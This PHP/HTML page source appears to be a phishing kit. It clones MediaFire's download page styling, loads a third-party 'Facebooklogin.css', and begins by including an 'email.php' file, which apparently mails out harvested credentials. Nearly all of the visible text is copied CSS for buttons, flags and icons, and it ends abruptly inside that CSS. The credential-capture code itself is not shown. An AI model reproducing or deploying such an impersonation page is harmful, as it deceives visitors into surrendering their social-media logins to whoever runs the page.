...
include "email.php";
?>
<html lang="id" style="height: 100%;" class="translated-ltr">
  <head>
    <meta charset="utf-8">
    ...
    <meta property="og:url" content="https://www.g-code.co.id/">
    ...
    <meta name="twitter:url" content="https://www.g-code.co.id/">
    ...
    <link rel="preconnect" href="https://fonts.googleapis.com">
        ...
        <link rel="stylesheet" href="https://cdn.statically.io/gh/Bagasaryaa/Css/blob/d105f452af81bfed67d2903c3d0593d249c306f4/Facebooklogin.css">
...
.popup-ariandi {
    ...
    <style type="text/css">
      ...
      .g-Btn:hover {
        ...
        background-image: -moz-linear-gradient(top, rgba(0, 0, 0, .05), rgba(0, 0, 0, .05));
        background-image: -ms-linear-gradient(top, rgba(0, 0, 0, .05), rgba(0, 0, 0, .05));
        background-image: -o-linear-gradient(top, rgba(0, 0, 0, .05), rgba(0, 0, 0, .05));
        background-image: linear-gradient(top, rgba(0, 0, 0, .05), rgba(0, 0, 0, .05))
      }

      .g-Btn--alt:hover {
        background-image: -webkit-linear-gradient(top, rgba(255, 255, 255, .08), rgba(255, 255, 255, .08));
        background-image: -moz-linear-gradient(top, rgba(255, 255, 255, .08), rgba(255, 255, 255, .08));
        background-image: -ms-linear-gradient(top, rgba(255, 255, 255, .08), rgba(255, 255, 255, .08));
        background-image: -o-linear-gradient(top, rgba(255, 255, 255, .08), rgba(255, 255, 255, .08));
        background-image: linear-gradient(top, rgba(255, 255, 255, .08), rgba(255, 255, 255, .08))
      }
      ...
      .g-Icon {
        ...
        height: 24px;
        width: 24px;
        background-image: url(/images/icons/svg_dark/icons_sprite.svg);
      ...
      .g-Icon--white {
        background-image: url(/images/icons/svg_light/icons_sprite.svg)
      }

      .g-Btn .g-Icon.g-Icon--right {
        margin: 0 -2px 0 8px
      }
      ...
      .g-Select {
        ...
        background: #fff url(/images/icons/svg_dark/arrow_dropdown.svg) right center no-repeat;
        color: #282F3D;
        margin: 0;
        padding: 0 20px 0 0;
        box-sizing: border-box;
      ...
      .d-hover:hover {
        background-image: -webkit-linear-gradient(top, rgba(0, 0, 0, .08), rgba(0, 0, 0, .08));
        background-image: -moz-linear-gradient(top, rgba(0, 0, 0, .08), rgba(0, 0, 0, .08));
        background-image: -ms-linear-gradient(top, rgba(0, 0, 0, .08), rgba(0, 0, 0, .08));
        background-image: -o-linear-gradient(top, rgba(0, 0, 0, .08), rgba(0, 0, 0, .08));
        background-image: linear-gradient(top, rgba(0, 0, 0, .08), rgba(0, 0, 0, .08))
      }
      ...
      .lightTheme .logo>a {
        background: url(/images/backgrounds/header/mf_logo_mono_reversed.svg) 0 center/180px auto no-repeat;
        opacity: .4
      }

      .lightTheme .user-menu .g-Btn {
        background-color: rgba(255, 255, 255, .15);
        box-shadow: inset 0 0 0 1px rgba(255, 255, 255, .08), 0 0 0 1px rgba(0, 0, 0, .05);
        color: #fff
      }
      ...
      .darkTheme .logo>a {
        background: url(/images/backgrounds/header/mf_logo_mono.svg) 0 center/180px auto no-repeat;
        opacity: .4
      }
      ...
      .customLogo .logo>a {
        background: url(//static.mediafire.com/images/backgrounds/header/mf_logo_full_color.svg) 0 center/contain no-repeat;
        opacity: 1
      }
      ...
      #goog-footer-translate .goog-te-combo {
        ...
        height: 36px;
        line-height: 36px;
        background: transparent url(/images/icons/svg_dark/arrow_dropdown.svg) right center no-repeat;
        border: 0;
        border-radius: 3px;
        margin: 0;
        box-sizing: border-box;
      ...
      .lightTheme #goog-header-translate .goog-te-combo {
        background-color: transparent;
        background-image: url(/images/icons/svg_light/arrow_dropdown.svg);
        color: #fff;
      ...
      .en #goog-header-translate {
        background-image: url(/images/flags_svg/usa.svg)
      }

      .af #goog-header-translate {
        background-image: url(/images/flags_svg/zaf.svg)
      }

      .sq #goog-header-translate {
        background-image: url(/images/flags_svg/alb.svg)
      }

      .am #goog-header-translate {
        background-image: url(/images/flags_svg/eth.svg)
      }

      .ar #goog-header-translate {
        background-image: url(/images/flags_svg/egy.svg)
      }

      .hy #goog-header-translate {
        background-image: url(/images/flags_svg/arm.svg)
      }

      .az #goog-header-translate {
        background-image: url(/images/flags_svg/aze.svg)
      }

      .eu #goog-header-translate {
        background-image: url(/images/flags_svg/basque_country.svg)
      }

      .be #goog-header-translate {
        background-image: url(/images/flags_svg/blr.svg)
      }

      .bn #goog-header-translate {
        background-image: url(/images/flags_svg/bgd.svg)
      }

      .bs #goog-header-translate {
        background-image: url(/images/flags_svg/bih.svg)
      }

      .bg #goog-header-translate {
        background-image: url(/images/flags_svg/bgr.svg)
      }

      .ca #goog-header-translate {
        background-image: url(/images/flags_svg/and.svg)
      }

      .ceb #goog-header-translate {
        background-image: url(/images/flags_svg/phl.svg)
      }

      .ny #goog-header-translate {
        background-image: url(/images/flags_svg/mwi.svg)
      }

      .zh-CN #goog-header-translate {
        background-image: url(/images/flags_svg/chn.svg)
      }

      .zh-TW #goog-header-translate {
        background-image: url(/images/flags_svg/hkg.svg)
      }

      .co #goog-header-translate {
        background-image: url(/images/flags_svg/fra.svg)
      }

      .hr #goog-header-translate {
        background-image: url(/images/flags_svg/hrv.svg)
      }

      .cs #goog-header-translate {
        background-image: url(/images/flags_svg/cze.svg)
      }

      .da #goog-header-translate {
        background-image: url(/images/flags_svg/dnk.svg)
      }

      .nl #goog-header-translate {
        background-image: url(/images/flags_svg/nld.svg)
      }

      .eo #goog-header-translate {
        background-image: url(/images/flags_svg/esperanto.svg)
      }

      .et #goog-header-translate {
        background-image: url(/images/flags_svg/est.svg)
      }
      ...
      .fi #goog-header-translate {
        background-image: url(/images/flags_svg/fin.svg)
      }
      ...
      .gl #goog-header-translate {
        background-image: url(/images/flags_svg/esp.svg)
      }

      .ka #goog-header-translate {
        background-image: url(/images/flags_svg/geo.svg)
      }

      .de #goog-header-translate {
        background-image: url(/images/flags_svg/deu.svg)
      }

      .el #goog-header-translate {
        background-image: url(/images/flags_svg/grc.svg)
      }

      .gu #goog-header-translate {
        background-image: url(/images/flags_svg/ind.svg)
      }

      .ht #goog-header-translate {
        background-image: url(/images/flags_svg/hti.svg)
      }

      .ha #goog-header-translate {
        background-image: url(/images/flags_svg/ner.svg)
      }
      ...
      .iw #goog-header-translate {
        background-image: url(/images/flags_svg/isr.svg)
      }
      ...
      .hu #goog-header-translate {
        background-image: url(/images/flags_svg/hun.svg)
      }

      .is #goog-header-translate {
        background-image: url(/images/flags_svg/isl.svg)
      }

      .ig #goog-header-translate {
        background-image: url(/images/flags_svg/nga.svg)
      }

      .id #goog-header-translate {
        background-image: url(/images/flags_svg/idn.svg)
      }

      .ga #goog-header-translate {
        background-image: url(/images/flags_svg/irl.svg)
      }

      .it #goog-header-translate {
        background-image: url(/images/flags_svg/ita.svg)
      }

      .ja #goog-header-translate {
        background-image: url(/images/flags_svg/jpn.svg)
      }
      ...
      .kk #goog-header-translate {
        background-image: url(/images/flags_svg/kaz.svg)
      }

      .km #goog-header-translate {
        background-image: url(/images/flags_svg/khm.svg)
      }

      .ko #goog-header-translate {
        background-image: url(/images/flags_svg/kor.svg)
      }

      .ku #goog-header-translate {
        background-image: url(/images/flags_svg/tur.svg)
      }

      .ky #goog-header-translate {
        background-image: url(/images/flags_svg/kgz.svg)
      }

      .lo #goog-header-translate {
        background-image: url(/images/flags_svg/lao.svg)
      }

      .la #goog-header-translate {
        background-image: url(/images/flags_svg/vat.svg)
      }

      .lv #goog-header-translate {
        background-image: url(/images/flags_svg/lva.svg)
      }

      .lt #goog-header-translate {
        background-image: url(/images/flags_svg/ltu.svg)
      }

      .lb #goog-header-translate {
        background-image: url(/images/flags_svg/lux.svg)
      }

      .mk #goog-header-translate {
        background-image: url(/images/flags_svg/mkd.svg)
      }

      .mg #goog-header-translate {
        background-image: url(/images/flags_svg/mdg.svg)
      }

      .ms #goog-header-translate {
        background-image: url(/images/flags_svg/mys.svg)
      }
      ...
      .mt #goog-header-translate {
        background-image: url(/images/flags_svg/mlt.svg)
      }

      .mi #goog-header-translate {
        background-image: url(/images/flags_svg/nzl.svg)
      }
      ...
      .mn #goog-header-translate {
        background-image: url(/images/flags_svg/mng.svg)
      }

      .my #goog-header-translate {
        background-image: url(/images/flags_svg/mmr.svg)
      }
      ...
      .no #goog-header-translate {
        background-image: url(/images/flags_svg/nor.svg)
      }

      .ps #goog-header-translate {
        background-image: url(/images/flags_svg/afg.svg)
      }

      .fa #goog-header-translate {
        background-image: url(/images/flags_svg/irn.svg)
      }

      .pl #goog-header-translate {
        background-image: url(/images/flags_svg/pol.svg)
      }

      .pt #goog-header-translate {
        background-image: url(/images/flags_svg/prt.svg)
      }
      ...
      .ro #goog-header-translate {
        background-image: url(/images/flags_svg/rou.svg)
      }

      .ru #goog-header-translate {
        background-image: url(/images/flags_svg/rus.svg)
      }

      .sm #goog-header-translate {
        background-image: url(/images/flags_svg/wsm.svg)
      }

      .gd #goog-header-translate {
        background-image: url(/images/flags_svg/sco.svg)
      }

      .sr #goog-header-translate {
        background-image: url(/images/flags_svg/srb.svg)
      }
      ...
      .sn #goog-header-translate {
        background-image: url(/images/flags_svg/zwe.svg)
      }
      ...
      .si #goog-header-translate {
        background-image: url(/images/flags_svg/lka.svg)
      }

      .sk #goog-header-translate {
        background-image: url(/images/flags_svg/svk.svg)
      }

      .sl #goog-header-translate {
        background-image: url(/images/flags_svg/svn.svg)
      }

      .so #goog-header-translate {
        background-image: url(/images/flags_svg/som.svg)
      }
      ...
      .sw #goog-header-translate {
        background-image: url(/images/flags_svg/uga.svg)
      }

      .sv #goog-header-translate {
        background-image: url(/images/flags_svg/swe.svg)
      }

      .tg #goog-header-translate {
        background-image: url(/images/flags_svg/tjk.svg)
      }
      ...
      .th #goog-header-translate {
        background-image: url(/images/flags_svg/tha.svg)
      }
      ...
      .uk #goog-header-translate {
        background-image: url(/images/flags_svg/ukr.svg)
      }

      .ur #goog-header-translate {
        background-image: url(/images/flags_svg/pak.svg)
      }

      .uz #goog-header-translate {
        background-image: url(/images/flags_svg/uzb.svg)
      }

      .vi #goog-header-translate {
        background-image: url(/images/flags_svg/vnm.svg)
      }

      .cy #goog-header-translate {
        background-image: url(/images/flags_svg/wal.svg)
      }
      ...
      .social-fb-cont>span {
        ...
        display: block;
        color: #3c5a98;
        background: #e6e9f1 url(//static.mediafire.com/images/backgrounds/download/social/fb_16x16.png) no-repeat 10px center;
      ...
      #download-arrow {
        ...
        background-image: url(//static.mediafire.com/images/download/arrow_chrome.png)
      }
      ...
      #mobile-turbo-dl-enable.lightbox .popup-container {
        background: #fff;
        position: fixed;
        margin: 10px;
        padding: 24px
      ...
      #mobile-turbo-dl-enable.lightbox .popup-container .mobile-turbo-dl-enable-title {
        font-size: 18px;
        display: block
      }

      #mobile-turbo-dl-enable.lightbox .popup-container .mobile-turbo-dl-enable-message {
        margin: 12px 0;
        display: block;
        font-size: 14px
      }

      #mobile-turbo-dl-btn-close {
        right: 0;
        top: 0;
        height: 40px;
        width: 40px;
        opacity: 0.4;
        background: url(//static.mediafire.com/images/icons/svg_dark/close.svg) center / 20px no-repeat;
        position: absolute
      }

      #mobile-turbo-dl-btn-enable {
        box-sizing: border-box;
        flex-direction: row;
      ...
      .lightbox .g-Btn--primary {
        color: #fff;
        background: #0070F0;
        background: var(--mf-blue4)
      }

      .lightbox .g-Btn--secondary {
        color: #575B65;
        color: var(--mf-gray4);
        background-color: #E9EAEB;
        background-color: var(--mf-gray10)
      ...
      .lightbox a.g-Btn--primary:hover,
      .lightbox a.g-Btn--tertiary:hover,
      .lightbox a.g-Btn--alt:hover {
        color: #fff
      }

      .lightbox a.g-Btn--secondary:hover {
        color: #575B65;
        color: var(--mf-gray4)
      }
      ...
      .lightbox .g-Icon {
        ...
        height: 24px;
        width: 24px;
        background-image: url(//static.mediafire.com/images/icons/svg_dark/icons_sprite.svg);
        background-repeat: no-repeat
      }

      .lightbox .g-Btn .g-Icon {
        margin: 0 8px 0 -2px
      }

      .lightbox .dropdown .g-Icon {
        margin-right: 8px;
        opacity: 0.5
      }

      .lightbox .g-Icon--white {
        background-image: url(//static.mediafire.com/images/icons/svg_light/icons_sprite.svg)
      }

      .lightbox .g-Btn .g-Icon.g-Icon--right {
        margin: 0 -2px 0 8px
      }

      .lightbox .g-Icon--arrowRight {
        background-position: -1632px 0
      }
      ...
      #footer .mflogo_footer {
        ...
        margin-top: -3px;
        text-align: center;
        background: url(//static.mediafire.com/images/v4images/backgrounds/mflogo_footer.png) right bottom no-repeat
      }
      ...
      .dl-promo-cont {
        ...
        display: block;
        padding: 8px;
        background: #474747 url(//static.mediafire.com/images/backgrounds/download/dl_promo_logo.png) 10px 8px no-repeat
      }
      ...
      .apps>ul a:before {
        ...
        height: 36px;
        width: 36px;
        background-image: url(//static.mediafire.com/images/backgrounds/download/apps_list_sprite-v6.png);
        background-repeat: no-repeat
      }

      .apps a[title="Windows Picture and Fax Viewer"]:before {
        background-position: 0 0
      }

      .apps a[title="Adobe Photoshop"]:before {
        background-position: 0 -36px
      }

      .apps a[title="Apple Preview"]:before {
        background-position: 0 -72px
      }

      .apps a[title="AppleWorks"]:before {
        background-position: 0 -72px
      }

      .apps a[title="Microsoft Word"]:before {
        background-position: 0 -144px
      }

      .apps a[title="LibreOffice"]:before {
        background-position: 0 -180px
      }

      .apps a[title="WinZip for PC"]:before {
        background-position: 0 -216px
      }

      .apps a[title="WinZip for Mac"]:before {
        background-position: 0 -324px
      }

      .apps a[title="7-Zip"]:before {
        background-position: 0 -252px
      }

      .apps a[title="QuickTime"]:before {
        background-position: 0 -288px
      }

      .apps a[title="Windows Media Player"]:before {
        background-position: 0 0
      }

      .apps a[title="VideoLAN VLC Media Player"]:before {
        background-position: 0 -360px
      }

      .apps a[title="Microsoft PowerPoint"]:before {
        background-position: 0 -396px
      }

      .apps a[title="iZip"]:before {
        background-position: 0 -468px
      }

      .apps a[title="iTunes"]:before {
        background-position: 0 -540px
      }

      .apps a[title="Apache OpenOffice"]:before {
        background-position: 0 -576px
      }

      .apps a[title="Sublime Text 2"]:before {
        background-position: 0 -612px
      }

      .apps a[title="Notepad++"]:before {
        background-position: 0 -648px
      }

      .apps a[title="Infix PDF Editor"]:before {
        background-position: 0 -684px
      }

      .apps a[title="Adobe Reader"]:before {
        background-position: 0 -720px
      }

      .apps a[title="Microsoft 365"]:before {
        background-position: 0 -108px
      }

      .apps a[title="PaintShop Pro"]:before {
        background-position: 0 -432px
      }

      .apps a[title="Roxio Creator"]:before {
        background-position: 0 -504px
      }

      .apps a[title="WordPerfect Office"]:before {
        background-position: 0 -756px
      }

      .apps a[title="Pinnacle Studio"]:before {
      ...
      .Download-compatibilityStatus.is-compatible span {
        background: url(//static.mediafire.com/images/icons/svg_dark/check_circle_green.svg) center / 18px no-repeat
      }

      .Download-compatibilityStatus.is-notCompatible span {
        background: url(//static.mediafire.com/images/icons/svg_dark/close_circle_red.svg) center / 18px no-repeat
      }
      ...
      .DLMobile-upsellBoxLogo {
        ...
        height: 60px;
        border-radius: 50%;
        background: #07f url(//static.mediafire.com/images/backgrounds/header/mf_logo_u1_flame_reversed.svg) center / auto 26px no-repeat
      }
      ...
      .DLExtraInfo-sectionGraphic .DLExtraInfo-statusOverlay div {
        background: url(//static.mediafire.com/images/icons/svg_dark/image-broken-variant.svg) center / 24px no-repeat;
        opacity: .2
      }
      ...
      .DLExtraInfo-uploadLocationRegion.continent-na {
        background-image: url(//static.mediafire.com/images/backgrounds/download/additional_content/continent-na.svg)
      }

      .DLExtraInfo-uploadLocationRegion.continent-sa {
        background-image: url(//static.mediafire.com/images/backgrounds/download/additional_content/continent-sa.svg)
      }
      ...
      .DLExtraInfo-uploadLocationRegion.continent-as {
        background-image: url(//static.mediafire.com/images/backgrounds/download/additional_content/continent-as.svg)
      }

      .DLExtraInfo-uploadLocationRegion.continent-af {
        background-image: url(//static.mediafire.com/images/backgrounds/download/additional_content/continent-af.svg)
      }

      .DLExtraInfo-uploadLocationRegion.continent-oc {
        background-image: url(//static.mediafire.com/images/backgrounds/download/additional_content/continent-oc.svg)
      }

      .DLExtraInfo-uploadLocationRegion.country-ru {
        background-image: url(//static.mediafire.com/images/backgrounds/download/additional_content/country-ru.svg)
      }

      .DLExtraInfo-uploadLocationRegion.country-tr {
        background-image: url(//static.mediafire.com/images/backgrounds/download/additional_content/country-tr.svg)
      }
      ...
      .DLExtraInfo-uploadIsp .DLExtraInfo-sectionGraphicCenter {
        background-image: url(//static.mediafire.com/images/backgrounds/download/additional_content/dt.svg)
      }

      .DLExtraInfo-accountStatusImage {
        background-image: url(//static.mediafire.com/images/backgrounds/download/additional_content/mf_round.svg)
      }

      .DLExtraInfo-referrer .DLExtraInfo-sectionIcon {
        background-image: url(//static.mediafire.com/images/backgrounds/download/additional_content/gh.svg)
      }

      .browser-android {
        background-image: url(//static.mediafire.com/images/backgrounds/download/additional_content/browser_android.png)
      }

      .browser-uc {
        background-image: url(//static.mediafire.com/images/backgrounds/download/additional_content/browser_uc.png)
      }

      .browser-chrome {
        background-image: url(//static.mediafire.com/images/backgrounds/download/additional_content/browser_chrome.svg)
      }

      .browser-edge {
        background-image: url(//static.mediafire.com/images/backgrounds/download/additional_content/browser_edge.svg)
      }

      .browser-firefox {
        background-image: url(//static.mediafire.com/images/backgrounds/download/additional_content/browser_firefox.svg)
      }

      .browser-ie {
        background-image: url(//static.mediafire.com/images/backgrounds/download/additional_content/browser_ie.svg)
      }

      .browser-opera {
        background-image: url(//static.mediafire.com/images/backgrounds/download/additional_content/browser_opera.svg)
      }

      .browser-safari {
        background-image: url(//static.mediafire.com/images/backgrounds/download/additional_content/browser_safari.svg)
      }

      .browser-samsung {
        background-image: url(//static.mediafire.com/images/backgrounds/download/additional_content/browser_samsung.svg)
      }

      .browser-unknown {
        background-image: url(//static.mediafire.com/images/backgrounds/download/additional_content/browser_unknown.svg)
      }
      ...
      .ExternalLink:after {
        ...
        vertical-align: baseline;
        margin-left: 4px;
        background: url(//static.mediafire.com/images/icons/svg_dark/external_link.svg) 0 1px no-repeat
      }
      ...
      .DLExtraInfo-compatibility .DLExtraInfo-sectionGraphicCenter {
        background-image: url(//static.mediafire.com/images/backgrounds/download/additional_content/wikipedia_logo_v2.svg)
      }
      ...
      .DLExtraInfo-downloadDataGraphic {
        background: url(//static.mediafire.com/images/icons/svg_dark/database.svg) 0 0 / 48px no-repeat
      }

      .DLExtraInfo-downloadFilesGraphic {
        background: url(//static.mediafire.com/images/icons/svg_dark/file_multiple.svg) 0 6px / 36px no-repeat
      }
      ...
      .flag-ioc-aru,
      .flag-fifa-aru {
        background-image: url(//static.mediafire.com/images/flags_svg/abw.svg)
      }
      ...
      .flag-ioc-afg,
      .flag-fifa-afg {
        background-image: url(//static.mediafire.com/images/flags_svg/afg.svg)
      }
      ...
      .flag-ioc-ang,
      .flag-fifa-ang {
        background-image: url(//static.mediafire.com/images/flags_svg/ago.svg)
      }
      ...
      .flag-ioc-aia,
      .flag-fifa-aia {
        background-image: url(//static.mediafire.com/images/flags_svg/aia.svg)
      }
      ...
      .flag-248,
      .flag-fifa-ald {
        background-image: url(//static.mediafire.com/images/flags_svg/ala.svg)
      }
      ...
      .flag-ioc-alb,
      .flag-fifa-alb {
        background-image: url(//static.mediafire.com/images/flags_svg/alb.svg)
      }
      ...
      .flag-ioc-and,
      .flag-fifa-and {
        background-image: url(//static.mediafire.com/images/flags_svg/and.svg)
      }
      ...
      .flag-ioc-uae,
      .flag-fifa-uae {
        background-image: url(//static.mediafire.com/images/flags_svg/are.svg)
      }
      ...
      .flag-ioc-arg,
      .flag-fifa-arg {
        background-image: url(//static.mediafire.com/images/flags_svg/arg.svg)
      }
      ...
      .flag-ioc-arm,
      .flag-fifa-arm {
        background-image: url(//static.mediafire.com/images/flags_svg/arm.svg)
      }
      ...
      .flag-ioc-asa,
      .flag-fifa-asa {
        background-image: url(//static.mediafire.com/images/flags_svg/asm.svg)
      }
      ...
      .flag-10,
      .flag-fifa-ros {
        background-image: url(//static.mediafire.com/images/flags_svg/ata.svg)
      }

      .flag-atf,
      .flag-tf,
      .flag-260 {
        background-image: url(//static.mediafire.com/images/flags_svg/atf.svg)
      }
      ...
      .flag-ioc-ant,
      .flag-fifa-atg {
        background-image: url(//static.mediafire.com/images/flags_svg/atg.svg)
      }
      ...
      .flag-ioc-aus,
      .flag-fifa-aus {
        background-image: url(//static.mediafire.com/images/flags_svg/aus.svg)
      }
      ...
      .flag-ioc-aut,
      .flag-fifa-aut {
        background-image: url(//static.mediafire.com/images/flags_svg/aut.svg)
      }
      ...
      .flag-ioc-aze,
      .flag-fifa-aze {
        background-image: url(//static.mediafire.com/images/flags_svg/aze.svg)
      }
      ...
      .flag-ioc-bdi,
      .flag-fifa-bdi {
        background-image: url(//static.mediafire.com/images/flags_svg/bdi.svg)
      }
      ...
      .flag-ioc-bel,
      .flag-fifa-bel {
        background-image: url(//static.mediafire.com/images/flags_svg/bel.svg)
      }
      ...
      .flag-ioc-ben,
      .flag-fifa-ben {
        background-image: url(//static.mediafire.com/images/flags_svg/ben.svg)
      }
      ...
      .flag-ioc-aho,
      .flag-fifa-ant {
        background-image: url(//static.mediafire.com/images/flags_svg/bes.svg)
      }
      ...
      .flag-ioc-bur,
      .flag-fifa-bfa {
        background-image: url(//static.mediafire.com/images/flags_svg/bfa.svg)
      }
      ...
      .flag-ioc-ban,
      .flag-fifa-ban {
        background-image: url(//static.mediafire.com/images/flags_svg/bgd.svg)
      }
      ...
      .flag-ioc-bul,
      .flag-fifa-bul {
        background-image: url(//static.mediafire.com/images/flags_svg/bgr.svg)
      }
      ...
      .flag-ioc-brn,
      .flag-fifa-bhr {
        background-image: url(//static.mediafire.com/images/flags_svg/bhr.svg)
      }
      ...
      .flag-ioc-bah,
      .flag-fifa-bah {
        background-image: url(//static.mediafire.com/images/flags_svg/bhs.svg)
      }
      ...
      .flag-ioc-bih,
      .flag-fifa-bih {
        background-image: url(//static.mediafire.com/images/flags_svg/bih.svg)
      }

      .flag-blm,
      .flag-bl,
      .flag-652 {
        background-image: url(//static.mediafire.com/images/flags_svg/blm.svg)
      }
      ...
      .flag-ioc-blr,
      .flag-fifa-blr {
        background-image: url(//static.mediafire.com/images/flags_svg/blr.svg)
      }
      ...
      .flag-ioc-biz,
      .flag-fifa-blz {
        background-image: url(//static.mediafire.com/images/flags_svg/blz.svg)
      }
      ...
      .flag-ioc-ber,
      .flag-fifa-ber {
        background-image: url(//static.mediafire.com/images/flags_svg/bmu.svg)
      }
      ...
      .flag-ioc-bol,
      .flag-fifa-bol {
        background-image: url(//static.mediafire.com/images/flags_svg/bol.svg)
      }
      ...
      .flag-ioc-bra,
      .flag-fifa-bra {
        background-image: url(//static.mediafire.com/images/flags_svg/bra.svg)
      }
      ...
      .flag-ioc-bar,
      .flag-fifa-brb {
        background-image: url(//static.mediafire.com/images/flags_svg/brb.svg)
      }
      ...
      .flag-ioc-bru,
      .flag-fifa-bru {
        background-image: url(//static.mediafire.com/images/flags_svg/brn.svg)
      }
      ...
      .flag-ioc-bhu,
      .flag-fifa-bhu {
        background-image: url(//static.mediafire.com/images/flags_svg/btn.svg)
      }

      .flag-bvt,
      .flag-bv,
      .flag-74 {
        background-image: url(//static.mediafire.com/images/flags_svg/bvt.svg)
      }
      ...
      .flag-ioc-bot,
      .flag-fifa-bot {
        background-image: url(//static.mediafire.com/images/flags_svg/bwa.svg)
      }
      ...
      .flag-ioc-caf,
      .flag-fifa-cta {
        background-image: url(//static.mediafire.com/images/flags_svg/caf.svg)
      }
      ...
      .flag-ioc-can,
      .flag-fifa-can {
        background-image: url(//static.mediafire.com/images/flags_svg/can.svg)
      }
      ...
      .flag-166,
      .flag-fifa-cck {
        background-image: url(//static.mediafire.com/images/flags_svg/cck.svg)
      }
      ...
      .flag-ioc-sui,
      .flag-fifa-sui {
        background-image: url(//static.mediafire.com/images/flags_svg/che.svg)
      }
      ...
      .flag-ioc-chi,
      .flag-fifa-chi {
        background-image: url(//static.mediafire.com/images/flags_svg/chl.svg)
      }
      ...
      .flag-ioc-chn,
      .flag-fifa-chn {
        background-image: url(//static.mediafire.com/images/flags_svg/chn.svg)
      }
      ...
      .flag-ioc-civ,
      .flag-fifa-civ {
        background-image: url(//static.mediafire.com/images/flags_svg/civ.svg)
      }
      ...
      .flag-ioc-cmr,
      .flag-fifa-cmr {
        background-image: url(//static.mediafire.com/images/flags_svg/cmr.svg)
      }
      ...
      .flag-ioc-cod,
      .flag-fifa-cod {
        background-image: url(//static.mediafire.com/images/flags_svg/cod.svg)
      }
      ...
      .flag-ioc-cgo,
      .flag-fifa-cgo {
        background-image: url(//static.mediafire.com/images/flags_svg/cog.svg)
      }
      ...
      .flag-ioc-cok,
      .flag-fifa-cok {
        background-image: url(//static.mediafire.com/images/flags_svg/cok.svg)
      }
      ...
      .flag-ioc-col,
      .flag-fifa-col {
        background-image: url(//static.mediafire.com/images/flags_svg/col.svg)
      }
      ...
      .flag-ioc-com,
      .flag-fifa-com {
        background-image: url(//static.mediafire.com/images/flags_svg/com.svg)
      }
      ...
      .flag-ioc-cpv,
      .flag-fifa-cpv {
        background-image: url(//static.mediafire.com/images/flags_svg/cpv.svg)
      }
      ...
      .flag-ioc-crc,
      .flag-fifa-crc {
        background-image: url(//static.mediafire.com/images/flags_svg/cri.svg)
      }
      ...
      .flag-ioc-cub,
      .flag-fifa-cub {
        background-image: url(//static.mediafire.com/images/flags_svg/cub.svg)
      }

      .flag-cuw,
      .flag-cw,
      .flag-531 {
        background-image: url(//static.mediafire.com/images/flags_svg/cuw.svg)
      }
      ...
      .flag-162,
      .flag-fifa-cxr {
        background-image: url(//static.mediafire.com/images/flags_svg/cxr.svg)
      }
      ...
      .flag-ioc-cay,
      .flag-fifa-cay {
        background-image: url(//static.mediafire.com/images/flags_svg/cym.svg)
      }
      ...
      .flag-ioc-cyp,
      .flag-fifa-cyp {
        background-image: url(//static.mediafire.com/images/flags_svg/cyp.svg)
      }
      ...
      .flag-ioc-cze,
      .flag-fifa-cze {
        background-image: url(//static.mediafire.com/images/flags_svg/cze.svg)
      }
      ...
      .flag-ioc-ger,
      .flag-fifa-ger {
        background-image: url(//static.mediafire.com/images/flags_svg/deu.svg)
      }
      ...
      .flag-ioc-dji,
      .flag-fifa-dji {
        background-image: url(//static.mediafire.com/images/flags_svg/dji.svg)
      }
      ...
      .flag-ioc-dma,
      .flag-fifa-dma {
        background-image: url(//static.mediafire.com/images/flags_svg/dma.svg)
      }
      ...
      .flag-ioc-den,
      .flag-fifa-den {
        background-image: url(//static.mediafire.com/images/flags_svg/dnk.svg)
      }
      ...
      .flag-ioc-dom,
      .flag-fifa-dom {
        background-image: url(//static.mediafire.com/images/flags_svg/dom.svg)
      }
      ...
      .flag-ioc-alg,
      .flag-fifa-alg {
        background-image: url(//static.mediafire.com/images/flags_svg/dza.svg)
      }
      ...
      .flag-ioc-ecu,
      .flag-fifa-ecu {
        background-image: url(//static.mediafire.com/images/flags_svg/ecu.svg)
      }
      ...
      .flag-ioc-egy,
      .flag-fifa-egy {
        background-image: url(//static.mediafire.com/images/flags_svg/egy.svg)
      }
      ...
      .flag-ioc-eri,
      .flag-fifa-eri {
        background-image: url(//static.mediafire.com/images/flags_svg/eri.svg)
      }
      ...
      .flag-732,
      .flag-fifa-sah {
        background-image: url(//static.mediafire.com/images/flags_svg/esh.svg)
      }
      ...
      .flag-ioc-esp,
      .flag-fifa-esp {
        background-image: url(//static.mediafire.com/images/flags_svg/esp.svg)
      }
      ...
      .flag-ioc-est,
      .flag-fifa-est {
        background-image: url(//static.mediafire.com/images/flags_svg/est.svg)
      }
      ...
      .flag-ioc-eth,
      .flag-fifa-eth {
        background-image: url(//static.mediafire.com/images/flags_svg/eth.svg)
      }
      ...
      .flag-ioc-fin,
      .flag-fifa-fin {
        background-image: url(//static.mediafire.com/images/flags_svg/fin.svg)
      }
      ...
      .flag-ioc-fij,
      .flag-fifa-fij {
        background-image: url(//static.mediafire.com/images/flags_svg/fji.svg)
      }
      ...
      .flag-ioc-flk,
      .flag-fifa-flk {
        background-image: url(//static.mediafire.com/images/flags_svg/flk.svg)
      }
      ...
      .flag-ioc-fra,
      .flag-fifa-fra {
        background-image: url(//static.mediafire.com/images/flags_svg/fra.svg)
      }
      ...
      .flag-ioc-far,
      .flag-fifa-fro {
        background-image: url(//static.mediafire.com/images/flags_svg/fro.svg)
      }
      ...
      .flag-ioc-fsm,
      .flag-fifa-fsm {
        background-image: url(//static.mediafire.com/images/flags_svg/fsm.svg)
      }
      ...
      .flag-ioc-gab,
      .flag-fifa-gab {
        background-image: url(//static.mediafire.com/images/flags_svg/gab.svg)
      }
      ...
      .flag-826,
      .flag-ioc-gbr {
        background-image: url(//static.mediafire.com/images/flags_svg/gbr.svg)
      }
      ...
      .flag-ioc-geo,
      .flag-fifa-geo {
        background-image: url(//static.mediafire.com/images/flags_svg/geo.svg)
      }
      ...
      .flag-831,
      .flag-fifa-gbg {
        background-image: url(//static.mediafire.com/images/flags_svg/ggy.svg)
      }
      ...
      .flag-ioc-gha,
      .flag-fifa-gha {
        background-image: url(//static.mediafire.com/images/flags_svg/gha.svg)
      }
      ...
      .flag-ioc-gib,
      .flag-fifa-gbz {
        background-image: url(//static.mediafire.com/images/flags_svg/gib.svg)
      }
      ...
      .flag-ioc-gui,
      .flag-fifa-gui {
        background-image: url(//static.mediafire.com/images/flags_svg/gin.svg)
      }
      ...
      .flag-ioc-gud,
      .flag-fifa-glp {
        background-image: url(//static.mediafire.com/images/flags_svg/glp.svg)
      }
      ...
      .flag-ioc-gam,
      .flag-fifa-gam {
        background-image: url(//static.mediafire.com/images/flags_svg/gmb.svg)
      }
      ...
      .flag-ioc-gbs,
      .flag-fifa-gnb {
        background-image: url(//static.mediafire.com/images/flags_svg/gnb.svg)
